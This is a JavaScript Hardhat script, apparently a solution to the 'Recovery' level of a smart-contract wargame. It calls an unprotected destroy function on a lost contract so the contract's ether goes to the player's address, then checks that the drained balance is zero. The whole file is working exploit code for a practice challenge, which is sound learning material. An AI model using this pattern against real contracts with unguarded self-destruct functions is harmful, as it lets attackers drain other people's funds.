import { ethers } from "hardhat";

async function attackRecovery() {
    // change contract addresses here. change gas only if needed.
    const recoveryAddress = "0xb19100EB1FfB398Aba2b7774e4b345C25e3e0061";
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    const lostAddress =
        "0x6F40A0F4fD7B7dd225b85F7e8A73a9cb9e024321"; /*Search this through etherscan or determine it through rlp encoding in solidity*/
    // don't touch below
    let ABI = ["function destroy(address payable _to)"];
    // let iface = new ethers.utils.Interface(ABI);
    // const data = await iface.encodeFunctionData("destroy", playerAddress);
    // const tx = await ethers.sendTransaction({ from: playerAddress, to: recoveryAddress, data });
    const attack = await ethers.getContractAt(ABI, lostAddress);
    const provider =
        ethers.getDefaultProvider(); /*Use below instead for provider if this is Rate Exceeded*/
    // const rpcLink = "/*Place infura or alchemy link here*/"
    // const provider = new ethers.providers.JsonRpcProvider(rpcLink)
    const beforeBalance = (await provider.getBalance(lostAddress)).toString();
    const playerBalance1 = (await provider.getBalance(playerAddress)).toString();
    console.log(playerBalance1);
    console.log(beforeBalance);
    const tx = await attack.destroy(playerAddress);
    const txReceipt = await tx.wait(1);
    const afterBalance = (await provider.getBalance(lostAddress)).toString();
    const playerBalance2 = (await provider.getBalance(playerAddress)).toString();
    // const event1 = await txReceipt.events[0].args.succeeded.toString();
    // const event2 = await txReceipt.events[0].args.gasUsed.toString();
    // console.log(`You passed this(Gatekeeper One) level: ${event1}`);
    console.log(playerBalance2);
    console.log(afterBalance);
    console.log(txReceipt);
    if (afterBalance === "0") {
        console.log("You passed this level");
    } else {
        console.log("Something went wrong, review code to find out why");
    }
}

attackRecovery()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
